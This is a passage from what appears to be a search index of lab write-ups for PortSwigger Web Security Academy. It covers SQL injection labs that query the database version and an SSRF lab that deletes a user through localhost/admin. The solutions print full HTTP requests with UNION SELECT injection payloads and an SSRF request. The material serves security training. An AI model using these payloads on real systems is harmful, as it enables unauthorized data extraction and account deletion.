same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0aca008a03ea55be81c7531f00dc005b.web-security-academy.net/\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n</code></pre> <p>After testing with basic UNION payloads, we find that there are two columns returned. </p> <p>The following query retrieves the database version.</p> Final payload<pre><code>GET /filter?category=Gifts'+UNION+SELECT+null,banner+FROM+v$version-- HTTP/2\nHost: 0aca008a03ea55be81c7531f00dc005b.web-security-academy.net\nCookie: session=vHP4Xt5RPT4TD8vzgc4yEg8biGUdELPe\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0aca008a03ea55be81c7531f00dc005b.web-security-academy.net/\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n</code></pre> <p></p>","path":["Resources","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on Oracle"],"tags":["injection","sql"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-4/","level":1,"title":"SQL injection attack, querying the database type and version on MySQL and Microsoft","text":"","path":["Resources","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on MySQL and Microsoft"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-4/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p> <p>To solve the lab, display the database version string.</p>","path":["Resources","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on MySQL and Microsoft"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-4/#solution","level":2,"title":"Solution","text":"<p>This lab's vulnerability also exists in the product category filter. </p> Initial request<pre><code>GET /filter?category=Accessories HTTP/2\nHost: 0a2000a704a6cc3882beecb30094003d.web-security-academy.net\nCookie: session=D0rDHXHnKigBaVlNS4XudF2vHwKuxnvx\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0a2000a704a6cc3882beecb30094003d.web-security-academy.net/\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n</code></pre> <p>Testing shows that there are two categories returned, and the following payload works to display arbitrary content.</p> Show arbitrary content<pre><code>Accessories' UNION SELECT null,'abc'-- -\n</code></pre> <p> Now we can send the following request to print out the database version:</p> Print the database version<pre><code>Accessories' UNION SELECT null,@@version-- -\n</code></pre> <p></p>","path":["Resources","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on MySQL and Microsoft"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-5/","level":1,"title":"SQL injection attack, listing the database contents on non-Oracle databases","text":"","path":["Resources","PortSwigger","SQL Injection","SQL injection attack, listing the database contents on non-Oracle databases"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-5/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.</p> <p>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.</p> <p>To solve the lab, log in as theÂ <code>administrator</code>Â user.</p>","path":["Resources","PortSwigger","SQL Injection","SQL injection attack, listing the database contents on non-Oracle databases"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-5/#solution","level":2,"title":"Solution","text":"<p>This lab </p>","path":["Resources","PortSwigger","SQL Injection","SQL injection attack, listing the database contents on non-Oracle databases"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SSRF/ssrf-lab-1/","level":1,"title":"Basic SSRF against the local server","text":"","path":["Resources","PortSwigger","SSRF","Basic SSRF against the local server"],"tags":["ssrf"]},{"location":"resources/PortSwigger/SSRF/ssrf-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab has a stock check feature which fetches data from an internal system.</p> <p>To solve the lab, change the stock check URL to access the admin interface atÂ <code>http://localhost/admin</code>Â and delete the userÂ <code>carlos</code>.</p>","path":["Resources","PortSwigger","SSRF","Basic SSRF against the local server"],"tags":["ssrf"]},{"location":"resources/PortSwigger/SSRF/ssrf-lab-1/#solution","level":2,"title":"Solution","text":"<p>Checking the stock of an item sends the following request:</p> Initial stock check<pre><code>POST /product/stock HTTP/1.1\nHost: 0a85006e04b1b88482b63daa007600e1.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net/product?productId=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 107\nOrigin: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net\nConnection: keep-alive\nCookie: session=l4jOdFtuL3McNvQR3uAr6rvmekArDVFZ\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\nstockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1 \n</code></pre> <p>Note that the stockAPI is making a call to <code>http://stock.weliketoshop.net/...</code>. </p> <p>We can try to change that to <code>localhost/admin</code> to see if we can get anything.</p> <p>Change the body of the POST request to <code>stockApi=http://localhost/admin</code>. Be sure to remove the storeId parameter or it will return \"not found\". </p> <p>When we send this we see the endpoints to delete the users.</p> <p></p> <p>Send the following POST request to solve the lab.</p> Delete carlos<pre><code>POST /product/stock HTTP/1.1\nHost: 0a85006e04b1b88482b63daa007600e1.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net/product?productId=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 107\nOrigin: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net\nConnection: keep-alive\nCookie: session=l4jOdFtuL3McNvQR3uAr6rvmekArDVFZ\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\nstockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos\n</code></pre>","path":["Resources","PortSwigger","SSRF","Basic SSRF against the local server"],"tags":["ssrf"]}]}